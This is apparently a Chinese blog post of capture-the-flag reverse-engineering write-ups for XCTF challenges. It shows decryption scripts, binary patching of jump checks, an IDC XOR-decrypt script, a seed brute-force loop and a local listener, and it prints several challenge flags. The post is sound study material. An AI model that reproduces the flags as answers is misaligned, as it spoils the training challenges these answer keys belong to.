<h2 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h2><p>虽然没完全理解程序逻辑，不过既然flag都明文存好了……</p>
<h2 id="no-strings-attached"><a href="#no-strings-attached" class="headerlink" title="no_strings_attached"></a>no_strings_attached</h2><p>这题似乎牵涉到编码……wp说动态调，算了算了……</p>
<blockquote>
<p>输出wprintf，应该是宽字节吧</p>
<p>我反正直接int当%c输出了…发现没啥问题</p>
<p>如果要解释一下的话…可能是这个编码在32bits的高24位都为0时，和ASCII等价吧</p>
</blockquote>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/3.png" alt="3"></p>
<p>解密部分，看了好久…</p>
<p>总之就是38个字符都会减去某个数值x，x从一个5个数的数组中依次取</p>
<p>一旦x取到数组结束，那么再从头开始</p>
<p>于是用个取余就好了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> nums[<span class="number">38</span>]=&#123;</span><br><span class="line">	<span class="number">5178</span>, <span class="number">5174</span>, <span class="number">5175</span>, <span class="number">5179</span>, <span class="number">5248</span>, <span class="number">5242</span>, <span class="number">5233</span>, <span class="number">5240</span>, <span class="number">5219</span>,</span><br><span class="line">	<span class="number">5222</span>, <span class="number">5235</span>, <span class="number">5223</span>, <span class="number">5218</span>, <span class="number">5221</span>, <span class="number">5235</span>, <span class="number">5216</span>, <span class="number">5227</span>, <span class="number">5233</span>,</span><br><span class="line">	<span class="number">5240</span>, <span class="number">5226</span>, <span class="number">5235</span>, <span class="number">5232</span>, <span class="number">5220</span>, <span class="number">5240</span>, <span class="number">5230</span>, <span class="number">5232</span>, <span class="number">5232</span>,</span><br><span class="line">	<span class="number">5220</span>, <span class="number">5232</span>, <span class="number">5220</span>, <span class="number">5230</span>, <span class="number">5243</span>, <span class="number">5238</span>, <span class="number">5240</span>, <span class="number">5226</span>, <span class="number">5235</span>,</span><br><span class="line">	<span class="number">5243</span>, <span class="number">5248</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> nums2[<span class="number">5</span>]=&#123;<span class="number">5121</span>, <span class="number">5122</span>, <span class="number">5123</span>, <span class="number">5124</span>, <span class="number">5125</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>**argv)</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">38</span>;i++)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%c"</span>,nums[i] - nums2[i%<span class="number">5</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//9447&#123;you_are_an_international_mystery&#125;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="csaw2013reversing2"><a href="#csaw2013reversing2" class="headerlink" title="csaw2013reversing2"></a>csaw2013reversing2</h2><p>程序不会执行到解密部分，patch改控制流即可</p>
<p>key-patcher好像有bug，还要我手动算jmp的偏移…</p>
<blockquote>
<p>反正计算偏移时，减去的是<strong>当前指令的下一条指令的地址</strong></p>
</blockquote>
<p>基本思路就是：让程序执行解密部分，再控制跳转到MessageBox函数</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/4.png" alt="4"></p>
<h2 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h2><p>在0x400832处下断点，不断c就可以每次发现flag的一个字符</p>
<p>没什么意思</p>
<h2 id="python-trade"><a href="#python-trade" class="headerlink" title="python-trade"></a>python-trade</h2><p>pyc逆向题，<a href="https://tool.lu/pyc/" target="_blank" rel="noopener">pyc在线反编译</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(message)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x = ord(i) ^ <span class="number">32</span></span><br><span class="line">        x = x + <span class="number">16</span></span><br><span class="line">        s += chr(x)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(s)</span><br><span class="line"></span><br><span class="line">correct = <span class="string">'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Input flag:'</span></span><br><span class="line">flag = raw_input()</span><br><span class="line"><span class="keyword">if</span> encode(flag) == correct:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'correct'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'wrong'</span></span><br></pre></td></tr></table></figure>
<p>解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">buf = base64.b64decode(<span class="string">"XlNkVmtUI1MgXWBZXCFeKY+AaXNt"</span>)</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> buf:</span><br><span class="line">	x = ord(i)</span><br><span class="line">	x -= <span class="number">16</span></span><br><span class="line">	x ^= <span class="number">32</span></span><br><span class="line">	flag += chr(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<p><del>base64我还真懒得找C库……</del></p>
<h2 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h2><p>迷宫问题，<a href="https://my.oschina.net/u/3763247/blog/1805781" target="_blank" rel="noopener">参考链接</a></p>
<h1 id="萌新入坑"><a href="#萌新入坑" class="headerlink" title="萌新入坑"></a>萌新入坑</h1><h2 id="reverse100"><a href="#reverse100" class="headerlink" title="reverse100"></a>reverse100</h2><p>.NET平台的逆向，exe文件，题目名字叫apk…</p>
<p>网上找了个ILSpy，反编译</p>
<p><del>算了还是直接搜wp吧</del></p>
<p>程序会往本地31337端口发flag，于是用python写个监听的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> BaseHTTPServer</span><br><span class="line">server_address = (<span class="string">'127.0.0.1'</span>, <span class="number">31337</span>)</span><br><span class="line">handler_class = BaseHTTPServer.BaseHTTPRequestHandler</span><br><span class="line">httpd = BaseHTTPServer.HTTPServer(server_address, handler_class)</span><br><span class="line">httpd.serve_forever()</span><br></pre></td></tr></table></figure>
<p>就这么收到了flag，虽然不知道程序里具体flag在哪</p>
<p>原来直接nc就可以了…</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 127.0.0.1 31337</span><br></pre></td></tr></table></figure>
<h2 id="rock"><a href="#rock" class="headerlink" title="rock"></a>rock</h2><p>C++的题，输入一个string</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/5.png" alt="5"></p>
<p>后面的三个函数应该仅用于混淆</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/6.png" alt="6"></p>
<p>这个函数的第一个参数应该是一个类</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a-&gt;vtable = <span class="number">0x401bf0</span>;</span><br><span class="line">a-&gt;x = <span class="number">0</span>;</span><br><span class="line">a-&gt;input_1 = <span class="built_in">std</span>::<span class="built_in">string</span>(input);</span><br><span class="line">a-&gt;input_2 = <span class="built_in">std</span>::<span class="built_in">string</span>(input);</span><br><span class="line">a-&gt;string3 = <span class="string">"FLAG23456912365453475897834567"</span> + <span class="built_in">std</span>::<span class="built_in">string</span>(input);</span><br></pre></td></tr></table></figure>
<p>虚表赋值，一个字段置0，后面2个字段保存输入的字符串，最后一个字段存放拼接的字符串</p>
<p>跟进下一个对此类进行操作的函数</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/7.png" alt="7"></p>
<p>首先检查长度为30，接下来是简单的字符操作</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">    a-&gt;input[i] = (a-&gt;input[i] ^ <span class="number">0x50</span>) + <span class="number">20</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line"> 	a-&gt;input[i] = (a-&gt;input[i] ^ <span class="number">0x10</span>) + <span class="number">9</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/8.png" alt="8"></p>
<p>用于检查的函数，转换过后的字符串要等于类中最后一个字段保存的字符串</p>
<p>而最后输出的flag就是我们保存的input副本，也就是输入值</p>
<p>解密代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>**argv)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span>* s = <span class="string">"FLAG23456912365453475897834567"</span>; <span class="comment">//len = 30</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">30</span>;i++)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%c"</span>,(((s[i]<span class="number">-9</span>)^<span class="number">0x10</span>)<span class="number">-20</span>)^<span class="number">0x50</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>提交flag的时候题目有问题…</p>
<blockquote>
<p>总结一下就是做C++逆向不要慌…</p>
<p>去掉无关信息还是可以看的</p>
<p>不过我不是很了解string这些的底层，指针引用等，逆向时只能选择相信出题人没有那么变态了</p>
</blockquote>
<h2 id="elf-re"><a href="#elf-re" class="headerlink" title="elf.re"></a>elf.re</h2><p>就是angr的第一个例题，提交flag格式仍然不对</p>
<h2 id="re-for-50-plz-50"><a href="#re-for-50-plz-50" class="headerlink" title="re-for-50-plz-50"></a>re-for-50-plz-50</h2><p>mips架构的…</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/9.png" alt="9"></p>
<p>IDA不能反编译，不过这题就是硬编码字符串和0x37异或，至于复杂的题…以后再说吧</p>
<h2 id="babyRE"><a href="#babyRE" class="headerlink" title="babyRE"></a>babyRE</h2><p>做过的题，judge函数被异或加密了</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/10.png" alt="10"></p>
<p>IDC脚本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;idc.idc&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">decrypt</span><span class="params">(from,size,key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> i,x;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=size;i++)&#123;</span><br><span class="line">        x = Byte(from);</span><br><span class="line">        x = (x^key);</span><br><span class="line">        PatchByte(from,x);</span><br><span class="line">        from = from + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>IDC&gt;decrypt(0x600B00,181,0xC);</code></p>
<p>然后 <code>U C P</code>三连，F5即可</p>
<blockquote>
<p>取消定义，看作代码，再看作函数过程</p>
</blockquote>
<p>不过平台上flag格式又不对</p>
<h2 id="zorro-bin"><a href="#zorro-bin" class="headerlink" title="zorro_bin"></a>zorro_bin</h2><p>一开始理解错解题思路了</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/11.png" alt="11"></p>
<p>第一个输入的数k，然后就让输入k个值，一堆异或之后得到<code>seed</code>，这里需要注意到，因为seed的取值会被检验，取值集合是固定的，而一堆数异或就等价于一个数异或，也就是说这里k的取值无关紧要，因此我们令<code>k=1</code>即可</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/12.png" alt="12"></p>
<p>然后就是常见的随机种子固定，<code>rand()</code>的输出序列固定了</p>
<p>是可以爆破出所有的seed值，也就是k=1时输入的那个值，但是没有必要，因为得到了取值集合之后还是需要一个一个喂给程序</p>
<p>由于范围不大，我们直接爆破<code>1-65535</code>即可，不符合的值会让程序直接退出，没有必要先爆破可能的seed值再喂</p>
<p>其中只有输入预期的seed值时，才会通过<code>MD5</code>检验，可以考虑把jz改成jmp，但是没有必要，因为输入了错误的seed时，flag也是乱码，让程序直接退出也是一样的</p>
<p>最后给出wp中的<code>shell</code>脚本</p>
<blockquote>
<p>有时间学一下shell脚本的使用，想着可以用pwn的思路起进程，不过比较麻烦</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(seq 1 65535); do echo -e "1\n$i" | ./zorro_bin | grep -i nullcon ; done</span><br></pre></td></tr></table></figure>
<p>这个脚本”猜测”了flag中会出现<code>nullcon</code>，也可以人工看……</p>
<p>最后输出 <code>The flag is nullcon{nu11c0n_s4yz_x0r1n6_1s_4m4z1ng}</code></p>
<blockquote>
<p>最后的思考：MD5占用了程序运行的很多时间，如果seed的取值范围更大，可以考虑nop掉</p>
</blockquote>
<h2 id="pingpong待做"><a href="#pingpong待做" class="headerlink" title="pingpong待做"></a>pingpong待做</h2><p>BCTF2017的题，android没有接触过，先放一下了</p>
<p><a href="https://blog.csdn.net/jasalee/article/details/70242837" target="_blank" rel="noopener">wp1</a></p>
<p><a href="https://www.xctf.org.cn/library/details/4cc5aad6db793bd6786b0f2a7e389ab7f37a1db3/" target="_blank" rel="noopener">wp2</a></p>
<h2 id="licensable待做"><a href="#licensable待做" class="headerlink" title="licensable待做"></a>licensable待做</h2><p>感觉应该要黑盒逆，以前熟悉过的OD现在全忘了…</p>
<p>存着吧，附：<a href="https://github.com/TeamContagion/CTF-Write-Ups/blob/master/ASIS-Finals-2016/Licensable/readme.md" target="_blank" rel="noopener">wp</a></p>
<h2 id="RM"><a href="#RM" class="headerlink" title="RM"></a>RM</h2><p>序列号就是flag</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/13.png" alt="13"></p>
<h2 id="baby-flash-222待做"><a href="#baby-flash-222待做" class="headerlink" title="baby_flash-222待做"></a>baby_flash-222待做</h2><p><a href="https://www.xctf.org.cn/library/details/e0d90ad9d0609320fd6743706135a80913d27b8d/" target="_blank" rel="noopener">官方wp</a></p>
<p>C++编译到flash的题目，wp中有swf文件的反编译，待做</p>
<h2 id="easyre-153"><a href="#easyre-153" class="headerlink" title="easyre-153"></a>easyre-153</h2><p>IDA打开发现没有main，我又忘记<strong>查壳</strong>了</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/14.png" alt="14"></p>
<p><code>upx -d</code>后，程序流程中输入当前子进程的pid</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/15.png" alt="15"></p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/16.png" alt="16"></p>
<p>然后就会输出假的flag……</p>
<p>在IDA里有这一段</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/17.png" alt="17"></p>
<p>lol是输出的函数，不过没看出来buf和输出有什么关联</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/18.png" alt="18"></p>
<p><del>好吧还是看writeup吧</del></p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/19.png" alt="19"></p>
<p>因为<code>1!=0</code>，所以永远会跳转到loc_80486D3，可以修改跳转指令，也可以直接通过lol的算法取得</p>
<blockquote>
<p>这可能是upx加壳后的问题，反编译后看不到这一段，还是得看看汇编</p>
<p>flag在这段”花指令”中……还是太年轻了</p>
</blockquote>
<p>修改跳转指令后，运行输入pid即可得到flag</p>
<p>另外，发现<del>(看了wp以后猜测)</del>这段数据经过一些算法就是flag</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>**argv)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>*a1 = <span class="string">"69800876143568214356928753"</span>;</span><br><span class="line">	<span class="keyword">char</span> flag[<span class="number">7</span>]; </span><br><span class="line">	flag[<span class="number">0</span>] = <span class="number">2</span> * a1[<span class="number">1</span>];</span><br><span class="line">	flag[<span class="number">1</span>] = a1[<span class="number">4</span>] + a1[<span class="number">5</span>];</span><br><span class="line">	flag[<span class="number">2</span>] = a1[<span class="number">8</span>] + a1[<span class="number">9</span>];</span><br><span class="line">	flag[<span class="number">3</span>] = <span class="number">2</span> * a1[<span class="number">12</span>];</span><br><span class="line">	flag[<span class="number">4</span>] = a1[<span class="number">18</span>] + a1[<span class="number">17</span>];</span><br><span class="line">	flag[<span class="number">5</span>] = a1[<span class="number">10</span>] + a1[<span class="number">21</span>];</span><br><span class="line">	flag[<span class="number">6</span>] = a1[<span class="number">9</span>] + a1[<span class="number">25</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%c"</span>, flag[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接当作char型运算即可，不用转换</p>
<blockquote>
<p>总结一下： 查壳，遇到假flag时看看汇编，也许flag在”花指令”中</p>
</blockquote>
<h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p>C++的string的逆向题，命令行参数输入</p>
<p>其中遍历一个字符串时，从begin()开始，到end()结束，迭代器如果等于end()，就表示遍历结束</p>
<blockquote>
<p>这里应该是迭代器相同就退出，而不是迭代器中的字符相同</p>
</blockquote>
<p>一顿分析以后发现，密文：</p>
<p>L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_{FL4G}_W0nt_b3_3X4ctly_th4t</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/20.png" alt="20"></p>
<p>正确的flag就是密文错位后的结果</p>
<p>不过这里内层的数组好像有点问题，因为是逐字符比较，gdb动态调一下</p>
<p>把跳转指令patch一下，比较失败也继续执行，这样我们只要不断从rax中获取数值就可以拼出flag了</p>
<p><code>ALEXCTF{W3_L0v3_C_W1th_CL45535}</code></p>
<p><a href="http://www.infohelp.org/alexctf2k17-rev100-c-_is_awesome/" target="_blank" rel="noopener">wp链接</a></p>
<p>动态调试加上脚本爆破，脚本我不会写……</p>
<blockquote>
<p>逐字符比较，尝试patch掉跳转指令，直接动态调试</p>
</blockquote>
<h2 id="Catch-Me待做"><a href="#Catch-Me待做" class="headerlink" title="Catch_Me待做"></a>Catch_Me待做</h2><p>题目给的附件有点问题好像</p>
<p><a href="https://github.com/raccoons-team/ctf/tree/master/2016-05-07-asis-ctf-quals/catch_me" target="_blank" rel="noopener">参考链接</a></p>
<p><a href="http://vladz.devzero.fr/016_ASIS-CTF-catchme.html" target="_blank" rel="noopener">参考链接</a></p>
<p>wp完全看不懂</p>
<h2 id="rev100"><a href="#rev100" class="headerlink" title="rev100"></a>rev100</h2><p>解压后看起来是个十六进制文件</p>
<p>用<code>xxd</code>让它恢复到原来的样子</p>
<p><code>xxd -r -p rev100</code></p>
<blockquote>
<p>好吧，大部分都是垃圾文字，但是中间夹杂着一下ASCII字母，可以看到flag…什么的。每个’h’后面都有两个有用的，我们把他们挑出来：</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash $ sed <span class="string">"s/ / /g"</span> rev100 | xxd -r | strings -n 1 | grep <span class="string">'^h'</span> | cut -c 2- | tr -d <span class="string">'\n'</span></span><br></pre></td></tr></table></figure>
<p>flag{poppopret}</p>
<p>这题…乏趣</p>
<h2 id="reverseme120"><a href="#reverseme120" class="headerlink" title="reverseme120"></a>reverseme120</h2><p>这个题卡了很久……经验不足</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/21.png" alt="21"></p>
<p>第一个函数对输入字符串v11进行了操作，不过很迷……根本看不出来它在干嘛</p>
<p>当时就一直在逆这部分的逻辑</p>
<p>后来看了wp才发现其中一段关键代码与base64有关</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/22.png" alt="22"></p>
<p>wp说显然这个这一串数组是base64的码表…<del>对不起我不认识</del></p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/23.png" alt="23"></p>
<p>黑盒测出v13就是base64加密后的结果</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/24.png" alt="24"></p>
<p>这里TM竟然是分两部分异或0x25……</p>
<p>最后解密就简单了….</p>
<p>把固定的字符串<code>you_know_how_to_remove_junk_code</code>异或0x25</p>
<p>得到<code>\JPzNKJRzMJRzQJzW@HJS@zOPKNzFJA@</code></p>
<p>再base64加密，<code>XEpQek5LSlJ6TUpSelFKeldASEpTQHpPUEtOekZKQUA</code></p>
<blockquote>
<p>base64的原理之前了解不多，试了试”@@@@”这种也可以加密…</p>
<p>关于做题：各种查表需要熟悉…</p>
<p>多动态调试，看看字符串被处理成什么样了</p>
</blockquote>
<h2 id="dMd-50"><a href="#dMd-50" class="headerlink" title="dMd-50"></a>dMd-50</h2><p>md5(flag) == “780438d5b6e29db0898bc4f0225935c0”</p>
<p>查一下就好了</p>
<h2 id="Leaked-Lisence待做"><a href="#Leaked-Lisence待做" class="headerlink" title="Leaked_Lisence待做"></a>Leaked_Lisence待做</h2><p>file之后发现是.xz文件，ubuntu和mac都解压失败，windows里加个后缀名.xz就解压出来了……</p>
<p>然后再file一下，发现还是tar文件，再改后缀名解压……</p>
<p>好了然后我就看不懂了，好像是和导出dll有关？</p>
<p><a href="http://sibears.ru/labs/ASIS-CTF-Quals-2016-Leaked_License/" target="_blank" rel="noopener">wp</a></p>
<h2 id="ReverseMe"><a href="#ReverseMe" class="headerlink" title="ReverseMe"></a>ReverseMe</h2><p>IDA打开后发现一大堆windows相关的函数，迷失在了库函数之中</p>
<blockquote>
<p>我又忘了看字符串窗口了</p>
</blockquote>
<p>找到关键函数</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/25.png" alt="25"></p>
<blockquote>
<p><strong>ROL1</strong>是循环左移，比如0x12345678变成0x78123456</p>
</blockquote>
<p>异或的key是从函数中取得的，发现每次运行都是</p>
<p>解密代码有点诡异，windows下用<strong>BYTE</strong>才成功输出，或者直接用unsigned char，再%c输出</p>
<blockquote>
<p>之前也有char输出乱码的情况，应该是溢出的问题</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>**argv)</span> </span>&#123;</span><br><span class="line">	BYTE key[] = &#123; <span class="number">26</span>, <span class="number">162</span>, <span class="number">47</span>, <span class="number">249</span>, <span class="number">148</span>, <span class="number">67</span>, <span class="number">60</span>, <span class="number">196</span>, <span class="number">77</span>, <span class="number">216</span>, <span class="number">140</span>, <span class="number">197</span>, <span class="number">91</span>, <span class="number">182</span>, <span class="number">110</span>, <span class="number">234</span>, <span class="number">163</span>, <span class="number">60</span>, <span class="number">201</span>, <span class="number">155</span>, <span class="number">188</span>, <span class="number">202</span>, <span class="number">173</span>, <span class="number">215</span>, <span class="number">126</span>&#125;;</span><br><span class="line">	BYTE v9[<span class="number">25</span>] = &#123; <span class="number">0x0F</span>, <span class="number">0x87</span>, <span class="number">0x62</span>, <span class="number">0x14</span>, <span class="number">0x01</span>, <span class="number">0xC6</span>, <span class="number">0xF0</span>, <span class="number">0x21</span>, <span class="number">0x30</span>, <span class="number">0x11</span>, <span class="number">0x50</span>, <span class="number">0xD0</span>, <span class="number">0x82</span>, <span class="number">0x23</span>, <span class="number">0xAE</span>, <span class="number">0x23</span>, <span class="number">0xEE</span>, <span class="number">0xA9</span>, <span class="number">0xB4</span>, <span class="number">0x52</span>, <span class="number">0x78</span>, <span class="number">0x57</span>, <span class="number">0x0C</span>, <span class="number">0x86</span>, <span class="number">0x8B</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">25</span>; i++) &#123;</span><br><span class="line">		BYTE temp = key[i]^v9[i];</span><br><span class="line">		BYTE res = (temp &lt;&lt; <span class="number">6</span>) | (temp &gt;&gt; <span class="number">2</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%c"</span>, res);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
